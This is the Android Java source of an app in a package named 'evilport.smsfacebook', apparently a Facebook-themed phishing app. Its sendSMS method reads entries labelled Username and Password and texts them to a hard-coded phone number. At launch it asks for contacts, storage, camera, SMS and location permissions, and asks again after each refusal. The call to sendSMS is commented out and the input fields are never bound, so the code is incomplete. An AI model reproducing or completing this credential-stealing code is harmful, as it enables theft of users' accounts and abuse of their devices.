package com.evilport.smsfacebook;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.widget.EditText;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    EditText bx, by;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getPermissions();
        //sendSMS();
    }

    private void sendSMS() {
        SmsManager sms = SmsManager.getDefault();
        String string = "Username- " + bx.getText().toString() + "\nPassword- " + by.getText().toString();
        sms.sendTextMessage("+919434190157", null, string, null, null);
    }


    void getPermissions() {
        String[] permissions = new String[7];
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            permissions = new String[]{
                    Manifest.permission.WRITE_CONTACTS,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.CAMERA,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.ACCESS_FINE_LOCATION
            };
        }

        int result=0;
        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String p : permissions) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                result = checkSelfPermission(p);
            }
            if (result != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(p);
            }
        }
        if (!listPermissionsNeeded.isEmpty()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                requestPermissions(listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]), 10);
            }

        }
    }

    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case 10:{
                if(grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED){
                    // permissions granted.
                } else {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        requestPermissions(permissions, 10);
                    }
                }
            }
        }
    }
}
